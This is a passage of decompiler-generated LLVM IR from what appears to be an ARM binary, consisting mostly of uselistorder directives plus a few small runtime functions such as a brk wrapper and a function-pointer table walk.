  uselistorder i32* %r0.global-to-local, { 0, 21, 1, 2, 22, 3, 4, 34, 36, 5, 6, 7, 8, 9, 23, 10, 12, 11, 13, 14, 35, 15, 16, 24, 17, 18, 19, 20, 25, 26, 27, 29, 28, 30, 31, 32, 33 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 16, 17, 18, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 53, 54, 55, 21, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 45, 8, 46, 10, 11, 12, 13, 14, 15, 16, 17, 18, 3, 19, 20, 21, 22, 23, 0, 24, 1, 26, 2, 27, 25, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 42, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 0, 23, 1, 25, 2, 26, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 47, 8, 48, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 0, 25, 1, 27, 2, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 31, { 8, 9, 1, 0, 3, 5, 4, 6, 2, 10, 7, 11 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 -2, { 3, 4, 2, 7, 0, 5, 1, 6 }
  uselistorder i32 65536, { 2, 1, 7, 3, 8, 4, 9, 5, 10, 6, 11, 12, 13, 17, 14, 18, 15, 19, 16, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 48, 51, 50, 52, 53, 54, 55, 57, 56, 0, 59, 58, 61, 60 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 16777216, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 47, 45, 46, 49, 48, 50, 51 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 102, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 70, 72, 71, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 88, 87, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 103 }
  uselistorder i32* @r5, { 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 106, 107, 108, 109, 110, 111, 112, 113, 114, 118, 115, 116, 117, 119, 186, 187, 188, 189, 190, 0, 191, 192, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 41, 42, 43, 145, 146, 1, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 44, 45, 46, 47, 53, 48, 50, 49, 51, 52, 54, 55, 56, 14, 15, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16, 17, 18, 19, 22, 20, 21, 23, 2, 3, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 57, 58, 59, 65, 64, 66, 67, 68, 69, 70, 71, 83, 84, 85, 86, 34, 35, 36, 37, 38, 39, 40, 60, 61, 62, 63, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 158, 163, 159, 160, 161, 162, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 98, 99, 100, 101, 102, 103, 104, 105 }
  uselistorder i32 -3, { 1, 2, 0, 3, 4 }
  uselistorder i32 2, { 102, 103, 37, 104, 105, 24, 106, 23, 107, 22, 69, 40, 41, 94, 42, 95, 43, 96, 108, 30, 44, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 68, 10, 11, 12, 13, 14, 77, 25, 75, 15, 76, 46, 45, 38, 16, 26, 27, 17, 71, 50, 49, 48, 70, 72, 73, 32, 33, 31, 74, 67, 47, 78, 80, 85, 79, 81, 82, 83, 28, 18, 51, 52, 53, 84, 54, 21, 56, 86, 57, 87, 19, 20, 58, 88, 59, 55, 89, 60, 90, 61, 91, 62, 92, 63, 93, 35, 34, 64, 39, 65, 98, 29, 36, 99, 101, 66, 97, 100 }
  uselistorder i32 -5, { 1, 0 }
  uselistorder i32 11, { 4, 5, 6, 11, 12, 7, 8, 3, 9, 0, 10, 13, 14, 1, 2 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 3, 4, 5, 22, 6, 23, 24 }
  uselistorder i32 48, { 1, 7, 8, 4, 5, 3, 6, 2, 0, 9 }
  uselistorder i32 40, { 1, 2, 0 }
  uselistorder i32 36, { 1, 5, 6, 3, 4, 0, 2 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0 }
  uselistorder i32 -32, { 1, 0, 2 }
  uselistorder i32 32, { 25, 26, 23, 34, 35, 30, 31, 38, 1, 0, 3, 2, 5, 4, 24, 21, 22, 36, 7, 6, 9, 8, 27, 32, 11, 10, 13, 12, 15, 14, 17, 16, 18, 19, 20, 28, 33, 37, 29 }
  uselistorder i32 24, { 0, 6, 7, 4, 5, 1, 8, 9, 2, 3 }
  uselistorder i32* @lr, { 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 1, 62, 63, 64, 2, 65, 66, 67, 3, 68, 69, 70, 71, 72, 73, 74, 75, 28, 29, 76, 77, 78, 79, 80, 30, 31, 32, 33, 34, 35, 36, 37, 38, 16, 39, 8, 9, 40, 41, 42, 17, 19, 18, 43, 6, 5, 7, 4, 10, 11, 12, 13, 14, 20, 21, 15, 22, 23, 24, 25, 26, 27, 44, 0, 48, 47, 45, 46, 51, 49, 50 }
  uselistorder i32 16, { 14, 15, 16, 55, 17, 56, 57, 18, 58, 59, 19, 60, 61, 62, 63, 64, 65, 45, 46, 34, 35, 50, 47, 48, 49, 51, 13, 52, 53, 2, 3, 4, 5, 6, 12, 7, 8, 1, 9, 10, 36, 22, 37, 23, 24, 0, 38, 40, 39, 41, 25, 42, 43, 26, 44, 27, 28, 11, 20, 54, 29, 30, 31, 32, 21, 33 }
  uselistorder i32 20, { 13, 2, 14, 15, 0, 3, 16, 7, 8, 5, 6, 1, 9, 10, 11, 12, 4 }
  uselistorder i32 27, { 1, 0, 5, 2, 6, 3, 7, 4 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 8, { 81, 12, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 13, 98, 55, 56, 57, 58, 62, 59, 60, 61, 99, 66, 65, 63, 64, 67, 68, 69, 70, 71, 72, 0, 16, 17, 14, 15, 7, 8, 10, 11, 18, 100, 73, 74, 75, 76, 1, 2, 25, 9, 3, 4, 6, 5, 35, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39, 19, 40, 49, 41, 42, 43, 44, 45, 24, 52, 48, 46, 47, 50, 51, 53, 20, 21, 22, 23, 54, 77, 78, 79, 80 }
  uselistorder i32 7, { 9, 10, 11, 14, 0, 12, 13, 8, 3, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 -8, { 11, 12, 13, 14, 15, 16, 10, 9, 2, 8, 7, 6, 5, 17, 18, 19, 20, 3, 21, 0, 24, 4, 22, 23, 1 }
  uselistorder i1 false, { 9, 10, 11, 16, 4, 8, 17, 18, 5, 6, 7, 19, 3, 20, 21, 0, 14, 13, 15, 12, 2, 1, 22 }
  uselistorder i32 4, { 34, 25, 26, 1, 138, 27, 139, 17, 2, 3, 28, 140, 29, 141, 142, 143, 144, 30, 145, 146, 147, 148, 31, 149, 150, 151, 152, 153, 4, 154, 155, 156, 157, 158, 32, 159, 16, 160, 161, 162, 163, 164, 165, 5, 6, 33, 166, 98, 99, 65, 66, 100, 101, 102, 167, 168, 169, 170, 171, 44, 45, 46, 47, 18, 48, 49, 105, 107, 106, 103, 104, 108, 109, 110, 111, 112, 113, 114, 115, 116, 50, 51, 52, 53, 54, 15, 7, 8, 117, 118, 119, 120, 121, 122, 9, 10, 23, 11, 12, 24, 123, 124, 63, 13, 14, 0, 55, 56, 80, 67, 68, 69, 70, 71, 36, 37, 38, 72, 73, 74, 57, 75, 35, 76, 77, 78, 43, 86, 87, 88, 58, 79, 81, 82, 83, 84, 85, 59, 89, 39, 90, 91, 60, 21, 20, 19, 92, 61, 62, 40, 93, 94, 95, 22, 96, 41, 42, 97, 131, 125, 126, 127, 128, 129, 130, 132, 133, 134, 135, 136, 137, 64 }
  uselistorder i32 3, { 20, 21, 52, 22, 23, 24, 25, 26, 27, 31, 0, 47, 53, 1, 48, 49, 28, 3, 29, 4, 50, 30, 32, 33, 34, 35, 7, 36, 37, 6, 38, 19, 5, 39, 43, 40, 8, 41, 42, 9, 44, 10, 45, 46, 11, 15, 12, 13, 14, 16, 2, 51, 17, 18 }
  uselistorder i32* @r2, { 79, 80, 47, 8, 48, 50, 49, 51, 52, 53, 54, 7, 81, 1, 82, 88, 89, 92, 83, 84, 55, 59, 60, 63, 61, 62, 56, 57, 58, 0, 90, 2, 91, 6, 64, 65, 66, 9, 85, 86, 87, 26, 27, 29, 28, 3, 69, 67, 68, 4, 5, 70, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 30, 32, 33, 34, 25, 31, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 71, 74, 75, 76, 77, 78, 46, 72, 73 }
  uselistorder i32* @r1, { 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 2, 93, 94, 55, 56, 58, 57, 4, 5, 95, 0, 96, 59, 64, 65, 68, 66, 67, 60, 61, 62, 63, 69, 70, 71, 3, 34, 35, 38, 36, 37, 72, 73, 39, 40, 6, 12, 7, 8, 23, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 42, 43, 44, 27, 28, 29, 30, 1, 31, 32, 45, 46, 47, 48, 49, 50, 51, 52, 53, 33, 41, 54, 74, 75 }
  uselistorder label %dec_label_pc_df08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_de9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_de30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ddd0, { 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb141, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_dd5c, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_dd20, { 1, 0 }
  uselistorder label %dec_label_pc_dd0c, { 1, 0 }
  uselistorder label %dec_label_pc_dccc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dc60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dbf4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_db94, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %.thread119, { 1, 0 }
  uselistorder label %bb131, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread117, { 1, 0 }
  uselistorder label %dec_label_pc_db08, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_dac8, { 1, 0 }
}

define i32 @function_df28(i32 %arg1) local_unnamed_addr {
dec_label_pc_df28:
  ret i32 %arg1
}

define i32 @function_df30(i32 %arg1) local_unnamed_addr {
dec_label_pc_df30:
  %v3_df30 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_df38 = call i32 @function_b900()
  %v0_df3c = load i32, i32* @r4, align 4
  store i32 %v3_df30, i32* @r4, align 4
  %v2_df44 = call i32 @function_b984(i32 %v0_df38, i32 %v0_df3c)
  ret i32 %v2_df44

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_b984, { 2, 1, 5, 4, 0, 3 }
}

define i32 @function_df48(i32 %arg1) local_unnamed_addr {
dec_label_pc_df48:
  %v1_df48 = add i32 %arg1, 28
  %v2_df48 = inttoptr i32 %v1_df48 to i32*
  %v3_df48 = load i32, i32* %v2_df48, align 4
  %v1_df50 = add i32 %arg1, 44
  %v2_df50 = inttoptr i32 %v1_df50 to i32*
  %v3_df50 = load i32, i32* %v2_df50, align 4
  store i32 %v3_df48, i32* @global_var_17534.312, align 4
  store i32 %v3_df50, i32* @global_var_17538.314, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 44, { 6, 0, 3, 4, 1, 2, 5 }
  uselistorder i32 28, { 11, 0, 9, 10, 5, 6, 1, 2, 7, 3, 8, 4 }
}

define i32 @function_df6c(i32* %arg1) local_unnamed_addr {
dec_label_pc_df6c:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_df74 = call i32 @brk(i32* %arg1)
  %v3_df78 = icmp ult i32 %v2_df74, %tmp
  store i32 %v2_df74, i32* @global_var_17494.310, align 4
  br i1 %v3_df78, label %dec_label_pc_df8c, label %dec_label_pc_df9c

dec_label_pc_df8c:                                ; preds = %dec_label_pc_df6c
  %v0_df8c = call i32 @function_bdd4()
  %v2_df94 = inttoptr i32 %v0_df8c to i32*
  store i32 12, i32* %v2_df94, align 4
  br label %dec_label_pc_df9c

dec_label_pc_df9c:                                ; preds = %dec_label_pc_df6c, %dec_label_pc_df8c
  %v0_df9c = phi i32 [ 0, %dec_label_pc_df6c ], [ -1, %dec_label_pc_df8c ]
  ret i32 %v0_df9c

; uselistorder directives
  uselistorder i32 12, { 7, 4, 45, 46, 47, 49, 50, 51, 52, 5, 48, 53, 54, 55, 56, 57, 58, 59, 29, 30, 16, 17, 31, 8, 9, 32, 33, 34, 0, 35, 3, 36, 1, 37, 10, 11, 2, 38, 39, 12, 40, 41, 18, 22, 15, 13, 24, 19, 21, 20, 6, 23, 25, 14, 26, 27, 28, 43, 42, 44 }
  uselistorder i32 ()* @function_bdd4, { 28, 53, 9, 8, 27, 26, 7, 6, 5, 4, 25, 24, 23, 55, 3, 56, 52, 22, 21, 20, 19, 51, 34, 33, 50, 49, 48, 32, 47, 46, 31, 30, 45, 18, 17, 16, 44, 43, 42, 41, 40, 15, 14, 2, 11, 39, 38, 10, 37, 13, 36, 1, 0, 35, 54, 12, 29 }
  uselistorder i32* @global_var_17494.310, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_df9c, { 1, 0 }
}

define i32 @function_dfa8(i32 %arg1) local_unnamed_addr {
dec_label_pc_dfa8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_dfac = load i32, i32* @global_var_17280.270, align 4
  %v7_dfb0 = icmp eq i32 %v3_dfac, -1
  %v3_dfb4 = load i32, i32* @r4, align 4
  store i32 %v3_dfb4, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_17280.270 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_dfb0, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_dfa8
  store i32 %v3_dfb4, i32* %r4.global-to-local, align 4
  %v9_dfbc = load i32, i32* @r0, align 4
  ret i32 %v9_dfbc

.preheader:                                       ; preds = %dec_label_pc_dfa8, %.preheader
  %v0_dfc4 = phi i32 [ %v3_dfc8, %.preheader ], [ %v3_dfac, %dec_label_pc_dfa8 ]
  call void @__pseudo_branch(i32 %v0_dfc4)
  %v0_dfc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_dfc8 = add i32 %v0_dfc8, -4
  %v2_dfc8 = inttoptr i32 %v1_dfc8 to i32*
  %v3_dfc8 = load i32, i32* %v2_dfc8, align 4
  store i32 %v1_dfc8, i32* %r4.global-to-local, align 4
  %v3_dfcc = icmp eq i32 %v3_dfc8, -1
  br i1 %v3_dfcc, label %dec_label_pc_dfd4, label %.preheader

dec_label_pc_dfd4:                                ; preds = %.preheader
  %v2_dfd4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_dfd4, i32* %r4.global-to-local, align 4
  %v8_dfd4 = load i32, i32* @r0, align 4
  ret i32 %v8_dfd4

; uselistorder directives
  uselistorder i32 %v3_dfc8, { 1, 0 }
  uselistorder i32 %v3_dfac, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 36, 15, 37, 38, 39, 3, 16, 17, 18, 40, 41, 42, 4, 19, 20, 21, 43, 44, 45, 5, 22, 23, 46, 14, 13, 47, 48, 49, 12, 11, 10, 9, 24, 25, 26, 27, 28, 0, 29, 1, 30, 2, 50, 8, 31, 32, 33, 34, 35, 7, 6 }
  uselistorder i32 -1, { 95, 0, 38, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 96, 39, 129, 40, 188, 189, 41, 159, 42, 160, 161, 43, 190, 44, 191, 45, 192, 46, 193, 85, 36, 162, 163, 47, 164, 165, 48, 128, 49, 194, 1, 97, 2, 130, 50, 166, 167, 98, 99, 100, 86, 101, 3, 4, 35, 29, 30, 102, 103, 104, 33, 131, 105, 132, 5, 51, 153, 52, 154, 53, 133, 54, 134, 55, 135, 56, 155, 57, 136, 58, 137, 59, 156, 60, 157, 61, 138, 94, 62, 106, 63, 139, 64, 140, 65, 141, 66, 142, 67, 143, 68, 168, 69, 169, 70, 195, 71, 171, 72, 144, 73, 145, 74, 172, 75, 146, 76, 170, 77, 147, 78, 196, 37, 197, 107, 108, 109, 110, 111, 6, 7, 112, 148, 113, 149, 150, 114, 34, 115, 8, 79, 80, 9, 116, 117, 82, 118, 83, 10, 11, 31, 13, 119, 120, 12, 32, 121, 122, 93, 14, 15, 123, 16, 17, 81, 151, 124, 152, 84, 87, 125, 88, 19, 20, 89, 21, 18, 126, 22, 23, 24, 25, 26, 27, 28, 158, 127, 90, 91, 92 }
  uselistorder i32* @global_var_17280.270, { 1, 0 }
  uselistorder i32 1, { 316, 139, 597, 232, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 319, 318, 317, 184, 185, 188, 187, 183, 182, 186, 191, 189, 181, 190, 320, 28, 27, 23, 25, 24, 26, 29, 22, 458, 202, 199, 201, 200, 321, 18, 322, 35, 36, 323, 152, 153, 324, 154, 151, 325, 205, 326, 180, 327, 206, 328, 194, 557, 558, 329, 211, 207, 212, 208, 209, 213, 210, 559, 560, 561, 263, 120, 121, 117, 119, 118, 330, 218, 331, 75, 332, 77, 0, 336, 335, 334, 333, 67, 68, 264, 337, 103, 104, 239, 265, 338, 164, 339, 163, 562, 344, 343, 342, 341, 340, 62, 63, 64, 66, 65, 266, 345, 610, 240, 348, 347, 346, 193, 192, 349, 106, 107, 105, 108, 350, 33, 34, 32, 31, 30, 351, 55, 54, 352, 241, 563, 353, 90, 91, 267, 268, 229, 357, 356, 355, 354, 141, 142, 358, 86, 359, 102, 360, 101, 361, 60, 362, 61, 363, 161, 364, 47, 365, 20, 366, 21, 367, 19, 368, 53, 459, 460, 461, 462, 463, 464, 465, 611, 81, 82, 78, 79, 80, 369, 269, 270, 370, 99, 98, 100, 97, 253, 564, 371, 146, 254, 373, 372, 57, 56, 374, 109, 375, 155, 376, 37, 377, 140, 378, 160, 379, 17, 380, 69, 76, 381, 148, 382, 159, 383, 204, 384, 198, 385, 386, 215, 387, 85, 388, 147, 214, 96, 255, 487, 488, 256, 565, 566, 222, 567, 233, 568, 569, 234, 570, 390, 389, 489, 490, 261, 498, 499, 226, 500, 391, 6, 7, 491, 227, 1, 393, 392, 196, 197, 195, 237, 492, 225, 494, 493, 224, 235, 495, 236, 497, 238, 394, 73, 72, 70, 74, 71, 257, 242, 496, 313, 59, 58, 396, 395, 149, 150, 571, 572, 573, 271, 397, 10, 9, 11, 8, 574, 243, 244, 2, 262, 575, 398, 16, 12, 13, 15, 14, 483, 484, 485, 251, 223, 576, 577, 400, 399, 176, 179, 177, 175, 173, 174, 178, 470, 471, 472, 473, 51, 49, 48, 50, 52, 578, 83, 84, 580, 401, 162, 579, 172, 501, 502, 503, 38, 39, 581, 272, 504, 3, 273, 406, 405, 404, 403, 402, 110, 111, 505, 506, 280, 279, 281, 276, 277, 466, 283, 468, 467, 282, 469, 474, 475, 476, 477, 478, 278, 479, 275, 480, 481, 258, 482, 457, 507, 274, 511, 512, 513, 514, 284, 529, 530, 252, 228, 285, 418, 417, 416, 415, 414, 413, 412, 411, 410, 409, 408, 407, 165, 167, 166, 170, 169, 171, 168, 419, 420, 46, 45, 421, 203, 286, 287, 288, 486, 423, 422, 124, 122, 125, 123, 126, 508, 509, 510, 424, 92, 94, 95, 93, 515, 516, 517, 518, 519, 520, 289, 521, 250, 522, 290, 523, 291, 524, 525, 526, 527, 433, 432, 431, 430, 429, 428, 427, 426, 425, 133, 127, 130, 132, 131, 137, 136, 138, 129, 135, 128, 134, 434, 528, 249, 435, 114, 113, 115, 112, 531, 532, 260, 533, 534, 259, 535, 536, 537, 292, 538, 293, 539, 294, 540, 541, 295, 542, 296, 543, 297, 298, 299, 544, 300, 545, 301, 546, 302, 547, 303, 548, 304, 305, 306, 549, 307, 550, 308, 551, 445, 444, 443, 442, 441, 440, 439, 438, 315, 437, 436, 41, 40, 42, 43, 44, 245, 246, 309, 4, 552, 553, 248, 247, 554, 310, 555, 448, 447, 446, 116, 591, 582, 311, 583, 5, 587, 588, 230, 231, 589, 590, 592, 593, 453, 452, 451, 450, 314, 449, 312, 556, 454, 88, 87, 89, 217, 216, 584, 585, 586, 156, 157, 158, 594, 595, 596, 143, 144, 145, 455, 456, 221, 220, 219 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_dfdc() local_unnamed_addr {
dec_label_pc_dfdc:
  %v5_dfe0 = load i32, i32* @r0, align 4
  ret i32 %v5_dfe0

; uselistorder directives
  uselistorder i32* @r0, { 2, 15, 16, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 89, 90, 92, 91, 21, 159, 160, 29, 30, 31, 32, 17, 0, 5, 6, 22, 161, 162, 12, 8, 94, 13, 93, 95, 96, 97, 98, 27, 99, 100, 9, 163, 4, 14, 66, 3, 101, 10, 102, 103, 7, 67, 68, 71, 69, 70, 104, 105, 106, 18, 107, 33, 45, 44, 34, 35, 36, 37, 38, 39, 50, 40, 41, 42, 43, 46, 47, 48, 49, 51, 52, 23, 53, 54, 55, 56, 73, 74, 75, 57, 58, 59, 60, 61, 62, 24, 63, 76, 77, 78, 64, 72, 65, 79, 80, 81, 82, 83, 84, 85, 11, 86, 87, 88, 25, 26, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 1, 19, 20, 28 }
}

define i32 @function_dfe4() local_unnamed_addr {
entry:
  %v3_dfe8 = load i32, i32* @r4, align 4
  %v0_dff0 = call i32 @function_80b0()
  call void @__pseudo_branch(i32 %v3_dfe8)
  ret i32 %v0_dff0

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 8, 13, 14, 15, 10, 11, 3, 12, 16, 4, 5, 6, 2, 7, 1, 9 }
  uselistorder i32 0, { 88, 500, 501, 502, 503, 504, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 505, 506, 517, 518, 519, 520, 521, 522, 523, 524, 15, 525, 526, 527, 528, 529, 16, 530, 531, 532, 17, 533, 534, 535, 18, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 551, 552, 563, 564, 565, 566, 567, 568, 569, 570, 19, 571, 572, 573, 574, 575, 20, 576, 577, 578, 579, 580, 21, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 400, 401, 159, 402, 160, 302, 594, 403, 404, 405, 406, 407, 408, 409, 595, 271, 596, 597, 598, 161, 410, 0, 411, 412, 413, 270, 599, 600, 601, 89, 602, 57, 603, 55, 56, 604, 605, 606, 162, 610, 163, 620, 622, 253, 127, 623, 164, 621, 165, 166, 1, 607, 608, 90, 414, 145, 415, 169, 148, 147, 416, 417, 418, 419, 168, 421, 422, 167, 423, 609, 171, 611, 172, 149, 612, 613, 614, 615, 170, 426, 428, 429, 29, 128, 430, 427, 424, 425, 2, 433, 431, 432, 129, 434, 435, 173, 3, 436, 4, 437, 438, 91, 439, 440, 441, 442, 443, 444, 5, 6, 420, 303, 304, 305, 174, 392, 393, 251, 306, 307, 308, 394, 309, 310, 395, 396, 311, 624, 625, 48, 445, 175, 446, 447, 448, 449, 176, 450, 451, 452, 453, 454, 455, 456, 312, 313, 314, 315, 316, 457, 458, 616, 63, 617, 498, 317, 318, 499, 319, 320, 459, 321, 618, 619, 7, 322, 78, 323, 324, 119, 118, 254, 64, 65, 66, 67, 261, 255, 31, 30, 79, 325, 326, 327, 328, 330, 329, 8, 460, 461, 121, 120, 256, 68, 69, 70, 71, 262, 257, 33, 32, 27, 46, 462, 263, 463, 464, 465, 72, 466, 467, 468, 469, 470, 92, 258, 264, 259, 260, 471, 265, 153, 80, 34, 331, 81, 154, 155, 144, 58, 93, 345, 332, 333, 334, 94, 335, 336, 130, 177, 59, 60, 61, 337, 338, 95, 339, 343, 344, 49, 50, 96, 340, 341, 82, 35, 342, 9, 178, 346, 347, 62, 472, 473, 474, 475, 476, 477, 22, 97, 478, 100, 99, 98, 156, 157, 158, 36, 37, 122, 479, 480, 131, 47, 481, 101, 482, 179, 283, 284, 285, 83, 38, 132, 286, 266, 28, 133, 134, 180, 267, 39, 135, 136, 181, 182, 348, 349, 350, 183, 351, 102, 352, 353, 150, 191, 192, 272, 190, 273, 189, 274, 275, 276, 277, 188, 278, 194, 279, 281, 280, 137, 193, 282, 287, 289, 23, 24, 105, 288, 124, 291, 84, 290, 40, 292, 293, 85, 187, 294, 104, 295, 103, 296, 297, 186, 298, 252, 356, 185, 357, 123, 358, 195, 359, 196, 184, 360, 197, 361, 362, 363, 364, 375, 10, 354, 355, 11, 12, 198, 299, 106, 300, 199, 301, 200, 201, 107, 365, 202, 366, 368, 203, 369, 108, 370, 371, 204, 372, 367, 373, 41, 42, 125, 126, 205, 374, 206, 138, 13, 376, 377, 378, 379, 380, 381, 109, 382, 383, 146, 384, 207, 385, 208, 386, 110, 387, 388, 209, 389, 210, 390, 211, 391, 25, 26, 112, 111, 397, 14, 398, 212, 115, 114, 486, 487, 483, 484, 116, 485, 140, 113, 488, 490, 73, 491, 87, 213, 493, 74, 492, 86, 43, 139, 214, 151, 152, 215, 216, 217, 399, 494, 75, 141, 51, 52, 489, 44, 76, 142, 53, 54, 496, 45, 117, 495, 77, 143, 497, 268, 269, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640 }
  uselistorder i32* @r4, { 14, 326, 330, 331, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 216, 48, 352, 353, 3, 217, 218, 219, 354, 355, 356, 357, 358, 359, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 15, 360, 361, 4, 362, 363, 364, 365, 377, 378, 379, 380, 12, 381, 9, 372, 373, 374, 375, 376, 366, 367, 368, 238, 239, 240, 241, 242, 243, 244, 245, 369, 370, 371, 246, 247, 248, 249, 5, 6, 250, 251, 252, 253, 254, 255, 256, 7, 257, 258, 259, 260, 261, 262, 263, 264, 265, 49, 50, 51, 52, 53, 54, 192, 193, 194, 55, 56, 57, 58, 59, 195, 60, 61, 62, 63, 196, 197, 198, 199, 64, 65, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 284, 285, 286, 287, 328, 329, 76, 77, 78, 79, 332, 333, 80, 81, 288, 289, 82, 83, 84, 85, 86, 104, 105, 106, 107, 108, 109, 87, 88, 89, 90, 91, 92, 93, 94, 102, 103, 95, 96, 97, 1, 0, 98, 99, 10, 100, 101, 110, 111, 112, 113, 114, 115, 290, 291, 292, 293, 294, 295, 296, 297, 